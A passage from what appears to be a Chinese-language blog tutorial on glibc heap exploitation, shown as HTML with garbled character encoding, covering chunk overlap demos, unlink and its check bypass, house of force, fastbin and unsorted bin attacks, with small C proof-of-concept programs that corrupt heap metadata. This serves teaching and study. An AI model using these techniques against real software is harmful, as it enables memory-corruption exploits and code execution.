alt="image-20201219214608484"></p><p>å¯ä»¥çœ‹åˆ°åˆ†é…äº†ä¸¤ä¸ª</p><p>è¿™æ—¶æˆ‘ä»¬æŠŠp1çš„sizeä½æ”¹å˜å†è¿›è¡Œé‡Šæ”¾ï¼Œå°±ä¼šè¿›å…¥fastbinä¸­</p><p>ç»§ç»­åˆ†é…æˆ‘ä»¬å°±å¯ä»¥æŠŠp2çš„æ•°æ®æ”¹å˜</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214801301.png" alt="image-20201219214801301"></p><p>fastbinå¦‚æˆ‘ä»¬æ‰€æ–™</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214832357.png" alt="image-20201219214832357"></p><p>æ¼”ç¤ºå®Œæˆ è¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥æ”¹å˜p2çš„æ•°æ®</p></blockquote><h3 id="4-æ¼”ç¤º2ï¼ˆsmallbinï¼‰"><a href="#4-æ¼”ç¤º2ï¼ˆsmallbinï¼‰" class="headerlink" title="4.æ¼”ç¤º2ï¼ˆsmallbinï¼‰"></a>4.æ¼”ç¤º2ï¼ˆsmallbinï¼‰</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//åˆ†é…ç¬¬ä¸€ä¸ª 0x80 çš„chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//é˜²æ­¢ä¸top chunkåˆå¹¶</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç›´æ¥æ–­ç‚¹</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215247031.png" alt="image-20201219215247031"></p><p>ä¿®æ”¹sizeå€¼ä¹‹å é‡Šæ”¾ è¿›å…¥unsortedbinä¸­</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215357168.png" alt="image-20201219215357168"></p><p>ç»§ç»­åˆ†é…</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215517292.png" alt="image-20201219215517292"></p><p>æˆ‘ä»¬è¿™æ ·å°±å¯ä»¥ç›´æ¥ä¿®æ”¹æ•°æ®äº†</p></blockquote><h3 id="5-æ¼”ç¤º3ï¼ˆå‘å‰overlapï¼‰"><a href="#5-æ¼”ç¤º3ï¼ˆå‘å‰overlapï¼‰" class="headerlink" title="5.æ¼”ç¤º3ï¼ˆå‘å‰overlapï¼‰"></a>5.æ¼”ç¤º3ï¼ˆå‘å‰overlapï¼‰</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//é˜²æ­¢ä¸topåˆå¹¶</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//ä¿®æ”¹pre_inuseåŸŸ</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//ä¿®æ”¹pre_sizeåŸŸ</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlinkè¿›è¡Œå‰å‘extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//å ä½å—</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ–­ç‚¹</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219220938551.png" alt="image-20201219220938551"></p><p>ä¿®æ”¹æŒ‡é’ˆå</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221233429.png" alt="image-20201219221233429"></p><p>æ­¤æ—¶é‡Šæ”¾p4  è¿›å…¥unsortedbinä¸­ å¦‚æœè¿›è¡Œåˆ†é… é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å‘å‰overlap</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221322641.png" alt="image-20201219221322641"></p><p>æˆ‘ä»¬æœ€åæ¥åˆ†é…ä¸€ä¸‹</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221445409.png" alt="image-20201219221445409"></p></blockquote><h2 id="0x05-unlink"><a href="#0x05-unlink" class="headerlink" title="0x05 unlink"></a>0x05 unlink</h2><h3 id="1-æ¦‚å¿µ-4"><a href="#1-æ¦‚å¿µ-4" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><ul><li>åŒå‘é“¾è¡¨ä¸­ç§»é™¤/æ·»åŠ ä¸€ä¸ªchunkæ—¶ï¼Œä¼šå‘ç”Ÿæ–­é“¾çš„æ“ä½œï¼Œè¿™ä¸ªæ–­é“¾çš„è¿‡ç¨‹å°±å«åšunlink</li><li>æ³¨æ„äº‹é¡¹ï¼šunlinkä¸å‘ç”Ÿåœ¨fastbinå’Œsmallbinä¸­ï¼Œæ‰€ä»¥fastbinå’Œsmallbinå®¹æ˜“äº§ç”Ÿæ¼æ´</li></ul><h3 id="2-å‘ç”Ÿåœºæ™¯"><a href="#2-å‘ç”Ÿåœºæ™¯" class="headerlink" title="2.å‘ç”Ÿåœºæ™¯"></a>2.å‘ç”Ÿåœºæ™¯</h3><p><strong>mallocæ—¶ï¼š</strong></p><ul><li>ä»æ°å¥½å¤§å°åˆé€‚çš„largebinä¸­è·å–chunkï¼Œå‘ç”Ÿunlink</li><li>ä»æ¯”mallocè¦æ±‚å¤§çš„largebinä¸­å–chunkï¼Œå‘ç”Ÿunlink</li></ul><p><strong>freeæ—¶ï¼š</strong></p><ul><li>freeä¹‹åï¼Œä¸å‰åç©ºé—²çš„chunkè¿›è¡Œåˆå¹¶</li></ul><p><strong>malloc consolidateæ—¶ï¼š</strong></p><ul><li>consolidateæ—¶ï¼Œchunkä¹‹é—´çš„unlink</li></ul><p><strong>reallocæ—¶ï¼š</strong></p><ul><li>å‘å‰æ‰©å±•ï¼Œåˆå¹¶ç‰©ç†ç›¸é‚»é«˜åœ°å€ç©ºé—²chunk</li></ul><h3 id="3-å¤è€çš„unlink"><a href="#3-å¤è€çš„unlink" class="headerlink" title="3.å¤è€çš„unlink"></a>3.å¤è€çš„unlink</h3><p>å…¶ä¸­Pä¸ºéœ€è¦é‡Šæ”¾/æ·»åŠ çš„chunk</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unlink_smallbin_intro.png" alt="img"></p><p>unlinkçš„ä»£ç </p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/JgR9imeK6YMQ2rZ.png" alt="image-20200723164353967"></p><blockquote><p>(1)å°†å‰ä¸€ä¸ªchunkå ç”¨çš„å†…å­˜åˆå¹¶åˆ°å½“å‰chunk;</p><p>(2)ä¿®æ”¹æŒ‡å‘å½“å‰chunkçš„æŒ‡é’ˆï¼Œæ”¹ä¸ºæŒ‡å‘å‰ä¸€ä¸ªchunkã€‚</p><p>(3)ä½¿ç”¨unlinkå®ï¼Œå°†å‰ä¸€ä¸ªfree chunkä»åŒå‘å¾ªç¯é“¾è¡¨ä¸­ç§»é™¤</p></blockquote><p>æ­¤ä¾‹æ¥è‡ªctf-wiki</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/old_unlink_vul.png" alt="img"></p><p>ç°åœ¨æœ‰ç‰©ç†ç©ºé—´è¿ç»­çš„ä¸¤ä¸ª chunkï¼ˆQï¼ŒNextchunkï¼‰ï¼Œå…¶ä¸­ Q å¤„äºä½¿ç”¨çŠ¶æ€ã€Nextchunk å¤„äºé‡Šæ”¾çŠ¶æ€ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬é€šè¿‡æŸç§æ–¹å¼ï¼ˆ<strong>æ¯”å¦‚æº¢å‡º</strong>ï¼‰å°† Nextchunk çš„ fd å’Œ bk æŒ‡é’ˆä¿®æ”¹ä¸ºæŒ‡å®šçš„å€¼ã€‚åˆ™å½“æˆ‘ä»¬ free(Q) æ—¶</p><ul><li>glibc åˆ¤æ–­è¿™ä¸ªå—æ˜¯ small chunk</li><li>åˆ¤æ–­å‰å‘åˆå¹¶ï¼Œå‘ç°å‰ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œä¸éœ€è¦å‰å‘åˆå¹¶</li><li>åˆ¤æ–­åå‘åˆå¹¶ï¼Œå‘ç°åä¸€ä¸ª chunk å¤„äºç©ºé—²çŠ¶æ€ï¼Œéœ€è¦åˆå¹¶</li><li>ç»§è€Œå¯¹ Nextchunk é‡‡å– unlink æ“ä½œ</li></ul><p>é‚£ä¹ˆ unlink å…·ä½“æ‰§è¡Œçš„æ•ˆæœæ˜¯ä»€ä¹ˆæ ·å­å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥æ¥åˆ†æä¸€ä¸‹</p><p><strong>ä»¥ä¸‹12å’Œ8éƒ½æ˜¯å¯¹äº32ä½æ¥è¯´çš„</strong></p><ul><li>FD=P-&gt;fd = target addr -12</li><li>BK=P-&gt;bk = expect value</li><li>FD-&gt;bk = BKï¼Œå³ *(target addr-12+12)=BK=expect value</li><li>BK-&gt;fd = FDï¼Œå³ *(expect value +8) = FD = target addr-12</li></ul><p>è¿™å¼ å›¾ç‰‡åº”è¯¥æ›´å¥½ç†è§£</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/BTQOKLG2XSyHqge.png" alt="image-20200723165236574"></p><h3 id="4-æ–°çš„unlink"><a href="#4-æ–°çš„unlink" class="headerlink" title="4.æ–°çš„unlink"></a>4.æ–°çš„unlink</h3><p>æ–°ç‰ˆçš„unlinkåŠ å…¥äº†ä¸‹é¢è¿™éƒ¨åˆ†ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸æŒ‡å‘Pï¼Œé‚£ä¹ˆå°±å‡ºç°äº†é—®é¢˜</p><p>é‚£å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿ</p><p>é¦–å…ˆæˆ‘ä»¬é€šè¿‡è¦†ç›–ï¼Œå°† nextchunk çš„ FD æŒ‡é’ˆæŒ‡å‘äº† fakeFDï¼Œå°† nextchunk çš„ BK æŒ‡é’ˆæŒ‡å‘äº† fakeBK ã€‚é‚£ä¹ˆä¸ºäº†é€šè¿‡éªŒè¯ï¼Œæˆ‘ä»¬éœ€è¦</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>å½“æ»¡è¶³ä¸Šè¿°ä¸¤å¼æ—¶ï¼Œå¯ä»¥è¿›å…¥ Unlink çš„ç¯èŠ‚ï¼Œè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p>å¦‚æœè®© fakeFD + 12 å’Œ fakeBK + 8 æŒ‡å‘åŒä¸€ä¸ªæŒ‡å‘ P çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆï¼š</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>å³é€šè¿‡æ­¤æ–¹å¼ï¼ŒP çš„æŒ‡é’ˆæŒ‡å‘äº†æ¯”è‡ªå·±ä½ 12 çš„åœ°å€å¤„ã€‚æ­¤æ–¹æ³•è™½ç„¶ä¸å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œä½†æ˜¯å¯ä»¥ä¿®æ”¹æŒ‡å‘ chunk çš„æŒ‡é’ˆï¼Œè¿™æ ·çš„ä¿®æ”¹æ˜¯å¯ä»¥è¾¾åˆ°ä¸€å®šçš„æ•ˆæœçš„ã€‚</p><h3 id="5-åˆ©ç”¨æ¡ä»¶"><a href="#5-åˆ©ç”¨æ¡ä»¶" class="headerlink" title="5.åˆ©ç”¨æ¡ä»¶"></a>5.åˆ©ç”¨æ¡ä»¶</h3><ol><li>UAF ï¼Œå¯ä¿®æ”¹ free çŠ¶æ€ä¸‹ smallbin æˆ–æ˜¯ unsorted bin çš„ fd å’Œ bk æŒ‡é’ˆ</li><li>å·²çŸ¥ä½ç½®å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¯è¿›è¡Œ UAF çš„ chunk</li></ol><h3 id="6-æ•ˆæœ"><a href="#6-æ•ˆæœ" class="headerlink" title="6.æ•ˆæœ"></a>6.æ•ˆæœ</h3><p>ä½¿å¾—å·²æŒ‡å‘ UAF chunk çš„æŒ‡é’ˆ ptr å˜ä¸º ptr - 0x18</p><h2 id="0x06-house-of-force"><a href="#0x06-house-of-force" class="headerlink" title="0x06 house of force"></a>0x06 house of force</h2><h3 id="1-åŸç†"><a href="#1-åŸç†" class="headerlink" title="1.åŸç†"></a>1.åŸç†</h3><p>æ”»å‡»è€…é€šè¿‡å †æº¢å‡ºæˆ–è€…å…¶ä»–æ–¹å¼ï¼Œæ§åˆ¶åˆ°topchunkçš„sizeæˆå‘˜ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿topchunkçš„åœ°å€è¶…å‡ºæ­£å¸¸çš„å †æ®µçš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶åˆ°è¶…å‡ºå †æ®µä¹‹å¤–çš„å†…å­˜</p><h3 id="2-åˆ©ç”¨æ¡ä»¶-2"><a href="#2-åˆ©ç”¨æ¡ä»¶-2" class="headerlink" title="2.åˆ©ç”¨æ¡ä»¶"></a>2.åˆ©ç”¨æ¡ä»¶</h3><ul><li>â‘ é€šè¿‡å †æº¢å‡ºæˆ–å…¶ä»–æ–¹å¼ï¼Œæ§åˆ¶åˆ°topchunkçš„sizeæˆå‘˜</li><li>â‘¡å°†topchunkçš„sizeæˆå‘˜å˜ä¸ºä¸€ä¸ªéå¸¸å¤§çš„æ•°ï¼Œè¿™æ ·topchunkå°±ä¼šè¶…å‡ºå†…å­˜ä¸­çš„å †æ®µï¼Œä»è€Œè®¿é—®åˆ°å…¶ä»–æ®µçš„å†…å­˜åœ°å€ï¼ˆgotè¡¨çš„åœ°å€ï¼‰</li><li>â‘¢æ­¤æ—¶é€šè¿‡mallocç”³è¯·å†…å­˜çš„æ—¶å€™ï¼Œç”³è¯·çš„å°±æ˜¯gotçš„å†…å­˜åœ°å€ï¼Œå°±å¯ä»¥æ›´æ”¹gotå†…å­˜çš„å†…å®¹</li></ul><h2 id="0x07-fastbin-attack"><a href="#0x07-fastbin-attack" class="headerlink" title="0x07 fastbin attack"></a>0x07 fastbin attack</h2><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><p>å…¶ä¸­ï¼Œå‰ä¸¤ç§ä¸»è¦æ¼æ´ä¾§é‡äºåˆ©ç”¨ <code>free</code> å‡½æ•°é‡Šæ”¾<strong>çœŸçš„ chunk æˆ–ä¼ªé€ çš„ chunk</strong>ï¼Œç„¶åå†æ¬¡ç”³è¯· chunk è¿›è¡Œæ”»å‡»ï¼Œåä¸¤ç§ä¾§é‡äºæ•…æ„ä¿®æ”¹ <code>fd</code> æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨ <code>malloc</code> ç”³è¯·æŒ‡å®šä½ç½® chunk è¿›è¡Œæ”»å‡»ã€‚</p><h2 id="0x08-unsorted-bin-attack"><a href="#0x08-unsorted-bin-attack" class="headerlink" title="0x08 unsorted bin attack"></a>0x08 unsorted bin attack</h2><h3 id="1-æ¦‚å¿µ-5"><a href="#1-æ¦‚å¿µ-5" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><p>Unsorted Bin Attack è¢«åˆ©ç”¨çš„å‰ææ˜¯æ§åˆ¶ Unsorted Bin Chunk çš„ bk æŒ‡é’ˆã€‚Unsorted Bin Attack å¯ä»¥è¾¾åˆ°çš„æ•ˆæœæ˜¯å®ç°ä¿®æ”¹ä»»æ„åœ°å€å€¼ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ•°å€¼ã€‚</p><h3 id="2-ä½¿ç”¨æƒ…å†µ"><a href="#2-ä½¿ç”¨æƒ…å†µ" class="headerlink" title="2.ä½¿ç”¨æƒ…å†µ"></a>2.ä½¿ç”¨æƒ…å†µ</h3><ol><li>Unsorted Bin åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œé‡‡ç”¨çš„éå†é¡ºåºæ˜¯ FIFOï¼Œ<strong>å³æ’å…¥çš„æ—¶å€™æ’å…¥åˆ° unsorted bin çš„å¤´éƒ¨ï¼Œå–å‡ºçš„æ—¶å€™ä»é“¾è¡¨å°¾è·å–</strong>ã€‚</li><li>åœ¨ç¨‹åº malloc æ—¶ï¼Œå¦‚æœåœ¨ fastbinï¼Œsmall bin ä¸­æ‰¾ä¸åˆ°å¯¹åº”å¤§å°çš„ chunkï¼Œå°±ä¼šå°è¯•ä» Unsorted Bin ä¸­å¯»æ‰¾ chunkã€‚å¦‚æœå–å‡ºæ¥çš„ chunk å¤§å°åˆšå¥½æ»¡è¶³ï¼Œå°±ä¼šç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œå¦åˆ™å°±ä¼šæŠŠè¿™äº› chunk åˆ†åˆ«æ’å…¥åˆ°å¯¹åº”çš„ bin ä¸­ã€‚</li></ol><h3 id="3-åŸç†è§£é‡Š"><a href="#3-åŸç†è§£é‡Š" class="headerlink" title="3.åŸç†è§£é‡Š"></a>3.åŸç†è§£é‡Š</h3><ol><li><p>unsortedbinæ­£å¸¸å­˜å‚¨freechunkçš„ç»“æ„å¦‚å›¾æ‰€ç¤ºï¼Œæ­¤æ—¶è¿™ä¸ªfreechunkæ˜¯æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æŒ‡é’ˆæ“æ§çš„ï¼ˆè™½ç„¶freeäº†ä½†æ²¡æœ‰ç½®ç©ºï¼‰<img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212418753.png" alt="image-20201222212418753"></p></li><li><p>å¦‚æœåœ¨å–èµ°å †å—ä¹‹å‰ï¼Œæˆ‘ä»¬å°†unsortedbinä¸­çš„chunkçš„bkæŒ‡é’ˆæ”¹ä¸ºæˆ‘ä»¬çš„targetåœ°å€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212555394.png" alt="image-20201222212555394"></p></li><li><p>æ­¤æ—¶æˆ‘ä»¬å»mallocå †å—çš„æ—¶å€™å°±ä¼šå‘ç”Ÿå¦‚ä¸‹ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** victim is free chunk **/</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213058942.png" alt="image-20201222213058942"></p><p>åœ¨æˆ‘ä»¬ç§»é™¤victimä¹‹åå°±å˜æˆäº†è¿™æ ·ã€‚æˆ‘ä»¬çš„targetçš„fdçš„å†…å®¹ä¸ºmalloc_stateç»“æ„ä½“çš„unsortedbiné“¾çš„fdæŒ‡é’ˆäº†</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213335526.png" alt="image-20201222213335526"></p></li></ol><h3 id="4-æ¼”ç¤º"><a href="#4-æ¼”ç¤º" class="headerlink" title="4.æ¼”ç¤º"></a>4.æ¼”ç¤º</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates unsorted bin attack by write a large "</span></span><br><span class="line">                  <span class="string">"unsigned long value into stack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">      <span class="built_in">stderr</span>,</span><br><span class="line">      <span class="string">"In practice, unsorted bin attack is generally prepared for further "</span></span><br><span class="line">      <span class="string">"attacks, such as rewriting the "</span></span><br><span class="line">      <span class="string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> target_var = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">          <span class="string">"Let's first look at the target we want to rewrite on stack:\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %ld\n\n"</span>, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *p = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate first normal chunk on the heap at: %p\n"</span>,</span><br><span class="line">          p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another normal chunk in order to avoid "</span></span><br><span class="line">                  <span class="string">"consolidating the top chunk with"</span></span><br><span class="line">                  <span class="string">"the first one during the free()\n\n"</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We free the first chunk now and it will be inserted in the "</span></span><br><span class="line">                  <span class="string">"unsorted bin with its bk pointer "</span></span><br><span class="line">                  <span class="string">"point to %p\n"</span>,</span><br><span class="line">          (<span class="keyword">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*------------VULNERABILITY-----------*/</span></span><br><span class="line"></span><br><span class="line">  p[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target_var - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the "</span></span><br><span class="line">                  <span class="string">"victim-&gt;bk pointer\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And we write it with the target address-16 (in 32-bits "</span></span><br><span class="line">                  <span class="string">"machine, it should be target address-8):%p\n\n"</span>,</span><br><span class="line">          (<span class="keyword">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's malloc again to get the chunk we just free. During "</span></span><br><span class="line">                  <span class="string">"this time, target should has already been "</span></span><br><span class="line">                  <span class="string">"rewrite:\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;target_var, (<span class="keyword">void</span> *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><img 